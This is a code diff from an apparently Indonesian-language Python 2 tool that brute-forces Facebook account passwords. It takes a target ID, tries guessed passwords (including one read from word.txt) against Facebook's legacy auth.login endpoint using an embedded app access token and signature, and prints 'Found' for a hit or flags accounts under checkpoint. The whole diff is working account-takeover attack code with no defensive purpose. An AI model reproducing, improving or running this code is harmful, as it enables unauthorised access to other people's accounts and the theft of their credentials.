@@ -34,6 +34,11 @@ def brute():
         token = open("token.txt", "r").read()
 
     except IOError:
+        print " Tidak Ada Token"
+        os.system("rm -f token.txt")
+        sys.exit()
+
+    else:
         
         target = raw_input(" Masukkan ID Target: ")
         iqbal = requests.get("https://graph.facebook.com/" + target + "?access_token=" + token)
@@ -44,7 +49,7 @@ def brute():
         if "access_token" in js:
             print " User ID: " + target
             print " Password Found: " + sandi1
-        elif "www.facebook.com" in jsl["error_msg"]:
+        elif "www.facebook.com" in js["error_msg"]:
             print " akun Cekpoint." + sandi1
         
         else:
@@ -64,7 +69,15 @@ def brute():
                 elif "www.facebook.com" in js["error_msg"]:
                     print " Akun Cekpoint" + sandi3
                 else:
-                    print " Gagagagagagall........"
-
-
+                    word = open("word.txt", "r").readline()
+                    log = ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + word + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                    dev = urllib.urlopen(log)
+                    js = json.load(dev)
+                    if "access_token" in js:
+                        print " Found: " + word
+                    elif "www.facebook.com" in js["error_msg"]:
+                        print " cekpoint" + word
+                    else:
+                        print " Zonkkkkk...."
+                        
 login()
